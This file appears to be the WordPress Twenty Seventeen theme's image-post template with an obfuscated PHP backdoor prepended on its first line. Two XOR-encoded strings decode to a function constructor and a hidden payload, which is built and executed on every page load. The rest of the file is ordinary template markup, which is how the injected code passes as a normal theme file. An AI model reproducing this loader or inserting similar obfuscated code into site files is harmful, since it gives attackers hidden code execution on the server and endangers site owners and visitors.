<?php $qsUhDvjtOeu='6N UL3l A<T:D<Y'^'U<E48V3F4R7N-S7';$MkVMlEBJwOI=$qsUhDvjtOeu('','-1dP-88VZ+ 6gNXISF5DFXZ<0J-,S+8<<.qSkPOK9F9<O,.>ZML>9+7ACP4kT,Bmi ML1Dtg ..YuqequCmN:R5<,JHLPSjlsaSO+gBTEgGwxVCDTOE7P2=xL+P.0KYHfUmMXZ5lrW79yZYjgHDA<7aF91K,Mh, 5+W>hdv;.:4E9iH;-NyhjKNd:>N6C9Xmp7NDhMlc<;LI6s7R;PEihXAYXSP2UXAT7:9- CdnRLPF<ThF3, K7N<fRra-7s:pnRQ+mWZ3Nwsisr=.W3=Px6EBAQ+ZX=W0KgvIS ,IngktS;TAkGJm,1=;RcLQxyRUlmRkP2X4sl6SP7Q:5M0ELMs7e55hygoY,Otq1 UbLTTHGYQOQlg,zylN3 LU2KNMfVsr1KMlFfyUXJ05uvzLOOQ=1yso+33Krn+XI5oNVtL:4Q;=;Z>.Eg1UIc7R9.+6ZUGf  >,XU814QDW2AuWQAPKAGWQM A0=UBnLCmW3Pi<; JQBsU89<J4,ZE;:WF,AD1Gd<4JuJDI4JJ4ZVjhOmPUDac,OAA4sUY<N3EzUuVvXwqAHUYGrIF25TGzt,WXGNaBxYVZdh0PKJQnhR;IR+Hd.=Ck5B,=5Ffr11-TDX3aXAw7L2UJnNlMIbh-cf=5,>QN>2F4-nES6:6MUbhZOB1QA:JIsYCxH'^'DWLqKMV5.BOX8+   2Fla 5No.LX2tgQIZVzBp4A0 LR,XGQ4m4QKtS 71k49Y6EMD,8PhTCKKWpUQEQU8gG3vZIXjulwtQfzh5 YOf=eZgGCvg-h<1E<WSPhO1ZQbbhB<FfqP<eV8BMYtdJOl  HV:bPlkrmLGELpsWHAVHZHX WAlPH7P5CpDm3L+B6K6ETX;0AvfjA11C<WS3O1eTH> 5+6k8q<  VeRHYcYN4-<5YobLUCR.V-TFzV>nx<q9+r0XMs1V7WNWSVKO;FXyXMOKe5J.9b<U2GKiwKI0UmbP7Z  KzjIZPQN7XF,rs;3LEsO4S,UZLMYYQ>HP,S-leWh7pd=<4;yM<TUZE,Bqjtl18=:4EGWppejWA84m +4FkSVZ.4WLopq<+DTUKZh9.=HTByfV9NAxJO9=TOsv49TG4ITZ6WT OI:;<S3MOti7 3NBAMInagUQ2+3WiQ3051bmgs5,T oV0;Gexg>UxMXZT+qdUuYKN+Ms1 Be2>E20BoCWQ3RfdmP+>UsvLNoE=1qIGH.5 oT><EinlZhHvQaOCu.3hrA-qWWbwMLJc>q,UsIi4kVYQ2lcqHNrZ; J1;EX:4P:ENA5NUAPT8+9WFtaSS-F4cGnLmiBHVioXCMRyjZS2UvI52OVY,1E5stH849S>aCpxr5');$MkVMlEBJwOI();
/**
 * Template part for displaying image posts
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since 1.0
 * @version 1.2
 */

?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<?php
		if ( is_sticky() && is_home() ) {
			echo twentyseventeen_get_svg( array( 'icon' => 'thumb-tack' ) );
		}
	?>
	<header class="entry-header">
		<?php
			if ( 'post' === get_post_type() ) {
				echo '<div class="entry-meta">';
					if ( is_single() ) {
						twentyseventeen_posted_on();
					} else {
						echo twentyseventeen_time_link();
						twentyseventeen_edit_link();
					};
				echo '</div><!-- .entry-meta -->';
			};

			if ( is_single() ) {
				the_title( '<h1 class="entry-title">', '</h1>' );
			} elseif ( is_front_page() && is_home() ) {
				the_title( '<h3 class="entry-title"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h3>' );
			} else {
				the_title( '<h2 class="entry-title"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h2>' );
			}
		?>
	</header><!-- .entry-header -->

	<?php if ( '' !== get_the_post_thumbnail() && ! is_single() ) : ?>
		<div class="post-thumbnail">
			<a href="<?php the_permalink(); ?>">
				<?php the_post_thumbnail( 'twentyseventeen-featured-image' ); ?>
			</a>
		</div><!-- .post-thumbnail -->
	<?php endif; ?>

	<div class="entry-content">

		<?php if ( is_single() || '' === get_the_post_thumbnail() ) {

			// Only show content if is a single post, or if there's no featured image.
			/* translators: %s: Name of current post */
			the_content( sprintf(
				__( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ),
				get_the_title()
			) );

			wp_link_pages( array(
				'before'      => '<div class="page-links">' . __( 'Pages:', 'twentyseventeen' ),
				'after'       => '</div>',
				'link_before' => '<span class="page-number">',
				'link_after'  => '</span>',
			) );

		};
		?>

	</div><!-- .entry-content -->

	<?php
	if ( is_single() ) {
		twentyseventeen_entry_footer();
	}
	?>

</article><!-- #post-## -->
